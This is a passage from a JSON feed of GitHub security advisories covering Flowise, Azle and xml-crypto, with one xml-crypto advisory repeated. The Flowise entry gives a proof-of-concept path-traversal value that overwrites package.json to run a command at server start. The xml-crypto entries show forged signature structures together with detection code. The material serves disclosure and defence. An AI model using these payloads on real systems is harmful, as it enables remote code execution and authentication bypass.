\"c4b8a8fb-9eb6-47ae-9caa-7702ef8baabb\",\n    \"loaderName\": \"Text File\",\n    \"loaderConfig\": {\n        \"txtFile\": \"data:text/plain;BASE64_ENCODEING_CONTENT,filename:/../../../../../usr/src/package.json\",\n        \"textSplitter\": \"\",\n        \"metadata\": \"\",\n        \"omitMetadataKeys\": \"\"\n    }\n}\n</code></pre>\n<p>The part after <code>filename:</code> of the <code>txtFile</code> parameter is the value used as <code>fileName</code> in the function.\nAdd <code>../</code> to the filename value to move to the top path, then specify <code>package.json</code> in the project folder <code>/usr/src/</code> as the path.</p>\n<img src=\"https://github.com/FlowiseAI/Flowise/assets/86613161/13fdc756-f4d3-45f9-9929-fd978f532a02\" alt=\"image\" width=\"663\">\n\n<p>Afterwards, when the user starts the server (<code>pnpm start</code>), the added script will be executed. (<code>touch /tmp/pyozzi-poc</code>)</p>\n<p><strong>- starting server with <code>touch /tmp/pyozzi-poc</code> command</strong>\n<img src=\"https://github.com/FlowiseAI/Flowise/assets/86613161/341be379-43ca-4acc-9126-dc398475fcf3\" alt=\"image\" width=\"737\"></p>\n<p><strong>- <code>/tmp/pyozzi-poc</code> file created</strong>\n<img src=\"https://github.com/FlowiseAI/Flowise/assets/86613161/15707068-c000-4d59-972d-89d969c27087\" alt=\"image\" width=\"751\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p><strong>Remote Code Execution (RCE)</strong>\nAlthough it is demonstrated here using the file creation command, you can obtain full server shell privileges by opening a reverse shell.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8vvx-qvq9-5948\">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8vvx-qvq9-5948</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7\">https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vvx-qvq9-5948\">https://github.com/advisories/GHSA-8vvx-qvq9-5948</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vvx-qvq9-5948",
            "title": "[flowise] Flowise allows arbitrary file write to RCE",
            "date_modified": "2025-03-14T18:48:45.000Z",
            "date_published": "2025-03-14T18:48:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vvx-qvq9-5948"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Calling <code>setTimer</code> in Azle versions <code>0.27.0</code>, <code>0.28.0</code>, and <code>0.29.0</code> causes an immediate infinite loop of timers to be executed on the canister, each timer attempting to clean up the global state of the previous timer.</p>\n<p>The infinite loop will occur with any valid invocation of <code>setTimer</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been fixed as of Azle version <code>0.30.0</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If a canister is caught in this infinite loop after calling <code>setTimer</code>, the canister can be upgraded and the timers will all be cleared, thus ending the loop.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/demergent-labs/azle/security/advisories/GHSA-xc76-5pf9-mx8m\">https://github.com/demergent-labs/azle/security/advisories/GHSA-xc76-5pf9-mx8m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29776\">https://nvd.nist.gov/vuln/detail/CVE-2025-29776</a></li>\n<li><a href=\"https://github.com/demergent-labs/azle/releases/tag/0.30.0\">https://github.com/demergent-labs/azle/releases/tag/0.30.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xc76-5pf9-mx8m\">https://github.com/advisories/GHSA-xc76-5pf9-mx8m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xc76-5pf9-mx8m",
            "title": "[azle] In Azle, calling `setTimer` causes infinite loop of timers",
            "date_modified": "2025-03-14T17:31:08.000Z",
            "date_published": "2025-03-14T17:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xc76-5pf9-mx8m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>An attacker may be able to exploit this vulnerability to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>All versions &lt;= 6.0.0 are affected. Please upgrade to version 6.0.1.</p>\n<p>If you are still using v2.x or v3.x please upgrade to the associated patch version.</p>\n<h1 id=\"indicators-of-compromise\">Indicators of Compromise</h1>\n<p>When logging XML payloads, check for the following indicators. If the payload includes encrypted elements, ensure you analyze the decrypted version for a complete assessment. (If encryption is not used, analyze the original XML document directly). This applies to various XML-based authentication and authorization flows, such as SAML Response payloads.</p>\n<h3 id=\"presence-of-comments-in-digestvalue\">Presence of Comments in <code>DigestValue</code></h3>\n<p>A <code>DigestValue</code> should <strong>not</strong> contain comments. If you find comments within it, this may indicate tampering.</p>\n<p><strong>Example of a compromised <code>DigestValue</code>:</strong></p>\n<pre><code class=\"language-xml\">&lt;DigestValue&gt;\n    &lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;\n    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=\n&lt;/DigestValue&gt;\n</code></pre>\n<h3 id=\"code-to-test\">Code to test</h3>\n<p>Pass in the decrypted version of the document</p>\n<pre><code class=\"language-js\">decryptedDocument = ... // yours to implement\n\nconst digestValues = xpath.select(\n  \"//*[local-name()='DigestValue'][count(node()) &gt; 1]\",\n  decryptedDocument,\n);\n\nif (digestValues.length &gt; 0) {\n  // Compromise detected, yours to implement\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed\">https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98\">https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07\">https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6\">https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1\">https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1\">https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29775\">https://nvd.nist.gov/vuln/detail/CVE-2025-29775</a></li>\n<li><a href=\"https://workos.com/blog/samlstorm\">https://workos.com/blog/samlstorm</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/advisories/GHSA-x3m8-899r-f7c3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3",
            "title": "[xml-crypto] xml-crypto Vulnerable to XML Signature Verification Bypass via DigestValue Comment",
            "date_modified": "2025-03-16T21:34:52.000Z",
            "date_published": "2025-03-14T17:16:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>An attacker may be able to exploit this vulnerability to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>All versions &lt;= 6.0.0 are affected. Please upgrade to version 6.0.1.</p>\n<p>If you are still using v2.x or v3.x please upgrade to the associated patch version.</p>\n<h1 id=\"indicators-of-compromise\">Indicators of Compromise</h1>\n<p>When logging XML payloads, check for the following indicators. If the payload includes encrypted elements, ensure you analyze the decrypted version for a complete assessment. (If encryption is not used, analyze the original XML document directly). This applies to various XML-based authentication and authorization flows, such as SAML Response payloads.</p>\n<h3 id=\"presence-of-comments-in-digestvalue\">Presence of Comments in <code>DigestValue</code></h3>\n<p>A <code>DigestValue</code> should <strong>not</strong> contain comments. If you find comments within it, this may indicate tampering.</p>\n<p><strong>Example of a compromised <code>DigestValue</code>:</strong></p>\n<pre><code class=\"language-xml\">&lt;DigestValue&gt;\n    &lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;\n    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=\n&lt;/DigestValue&gt;\n</code></pre>\n<h3 id=\"code-to-test\">Code to test</h3>\n<p>Pass in the decrypted version of the document</p>\n<pre><code class=\"language-js\">decryptedDocument = ... // yours to implement\n\nconst digestValues = xpath.select(\n  \"//*[local-name()='DigestValue'][count(node()) &gt; 1]\",\n  decryptedDocument,\n);\n\nif (digestValues.length &gt; 0) {\n  // Compromise detected, yours to implement\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed\">https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98\">https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07\">https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6\">https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1\">https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1\">https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29775\">https://nvd.nist.gov/vuln/detail/CVE-2025-29775</a></li>\n<li><a href=\"https://workos.com/blog/samlstorm\">https://workos.com/blog/samlstorm</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/advisories/GHSA-x3m8-899r-f7c3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3",
            "title": "[xml-crypto] xml-crypto Vulnerable to XML Signature Verification Bypass via DigestValue Comment",
            "date_modified": "2025-03-16T21:34:52.000Z",
            "date_published": "2025-03-14T17:16:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>An attacker may be able to exploit this vulnerability to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker to escalate privileges or impersonate another user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>All versions &lt;= 6.0.0 are affected. Please upgrade to version 6.0.1.</p>\n<p>If you are still using v2.x or v3.x please upgrade to the associated patch version.</p>\n<h1 id=\"indicators-of-compromise\">Indicators of Compromise</h1>\n<p>When logging XML payloads, check for the following indicators. If the payload includes encrypted elements, ensure you analyze the decrypted version for a complete assessment. (If encryption is not used, analyze the original XML document directly). This applies to various XML-based authentication and authorization flows, such as SAML Response payloads.</p>\n<h3 id=\"presence-of-comments-in-digestvalue\">Presence of Comments in <code>DigestValue</code></h3>\n<p>A <code>DigestValue</code> should <strong>not</strong> contain comments. If you find comments within it, this may indicate tampering.</p>\n<p><strong>Example of a compromised <code>DigestValue</code>:</strong></p>\n<pre><code class=\"language-xml\">&lt;DigestValue&gt;\n    &lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;\n    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=\n&lt;/DigestValue&gt;\n</code></pre>\n<h3 id=\"code-to-test\">Code to test</h3>\n<p>Pass in the decrypted version of the document</p>\n<pre><code class=\"language-js\">decryptedDocument = ... // yours to implement\n\nconst digestValues = xpath.select(\n  \"//*[local-name()='DigestValue'][count(node()) &gt; 1]\",\n  decryptedDocument,\n);\n\nif (digestValues.length &gt; 0) {\n  // Compromise detected, yours to implement\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed\">https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98\">https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07\">https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6\">https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1\">https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1\">https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29775\">https://nvd.nist.gov/vuln/detail/CVE-2025-29775</a></li>\n<li><a href=\"https://workos.com/blog/samlstorm\">https://workos.com/blog/samlstorm</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x3m8-899r-f7c3\">https://github.com/advisories/GHSA-x3m8-899r-f7c3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3",
            "title": "[xml-crypto] xml-crypto Vulnerable to XML Signature Verification Bypass via DigestValue Comment",
            "date_modified": "2025-03-16T21:34:52.000Z",
            "date_published": "2025-03-14T17:16:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x3m8-899r-f7c3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>An attacker may be able to exploit this vulnerability to bypass authentication or authorization mechanisms in systems that rely on xml-crypto for verifying signed XML documents. The vulnerability allows an attacker to modify a valid signed XML message in a way that still passes signature verification checks. For example, it could be used to alter critical identity or access control attributes, enabling an attacker with a valid account to escalate privileges or impersonate another user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>All versions &lt;= 6.0.0 are affected. Please upgrade to version 6.0.1.</p>\n<p>If you are still using v2.x or v3.x please upgrade to the associated patch version.</p>\n<h1 id=\"indicators-of-compromise\">Indicators of Compromise</h1>\n<p>When logging XML payloads, check for the following indicators. If the payload includes encrypted elements, ensure you analyze the decrypted version for a complete assessment. (If encryption is not used, analyze the original XML document directly). This applies to various XML-based authentication and authorization flows, such as SAML Response payloads.</p>\n<h3 id=\"multiple-signedinfo-nodes\">Multiple SignedInfo Nodes</h3>\n<p>There should not be more than one SignedInfo node inside a Signature. If you find multiple SignedInfo nodes, it could indicate an attack.</p>\n<pre><code class=\"language-xml\">&lt;Signature&gt;\n    &lt;SomeNode&gt;\n      &lt;SignedInfo&gt;\n        &lt;Reference URI=\"somefakereference\"&gt;\n          &lt;DigestValue&gt;forgeddigestvalue&lt;/DigestValue&gt;\n        &lt;/Reference&gt;\n      &lt;/SignedInfo&gt;\n    &lt;/SomeNode&gt;\n    &lt;SignedInfo&gt;\n        &lt;Reference URI=\"realsignedreference\"&gt;\n          &lt;DigestValue&gt;realdigestvalue&lt;/DigestValue&gt;\n        &lt;/Reference&gt;\n      &lt;/SignedInfo&gt;\n    &lt;/SignedInfo&gt;\n&lt;/Signature&gt;\n</code></pre>\n<h3 id=\"code-to-test\">Code to test</h3>\n<p>Pass in the decrypted version of the document</p>\n<pre><code class=\"language-js\">decryptedDocument = ... // yours to implement\n\n// This check is per-Signature node, not per-document\nconst signedInfoNodes = xpath.select(\".//*[local-name(.)='SignedInfo']\", signatureNode);\n\nif (signedInfoNodes.length === 0) {\n  // Not necessarily a compromise, but invalid. Should contain exactly one SignedInfo node\n  // Yours to implement\n}\n\nif (signedInfoNodes.length &gt; 1) {\n  // Compromise detected, yours to implement\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed\">https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98\">https://github.com/node-saml/xml-crypto/commit/886dc63a8b4bb5ae1db9f41c7854b171eb83aa98</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07\">https://github.com/node-saml/xml-crypto/commit/8ac6118ee7978b46aa56b82cbcaa5fca58c93a07</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6\">https://github.com/node-saml/xml-crypto/releases/tag/v2.1.6</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1\">https://github.com/node-saml/xml-crypto/releases/tag/v3.2.1</a></li>\n<li><a href=\"https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1\">https://github.com/node-saml/xml-crypto/releases/tag/v6.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29774\">https://nvd.nist.gov/vuln/detail/CVE-2025-29774</a></li>\n<li><a href=\"https://workos.com/blog/samlstorm\">https://workos.com/blog/samlstorm</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9p8x-f768-wp2g\">https://github.com/advisories/GHSA-9p8x-f768-wp2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9p8x-f768-wp2g",
            "title": "[xml-crypto] xml-crypto Vulnerable to XML Signature Verification Bypass via Multiple SignedInfo References",
            "date_modified": "2025-03-16T21:34:48.000Z",
            "date_published": "2025-03-14T17:14:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9p8x-f768-wp2g"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}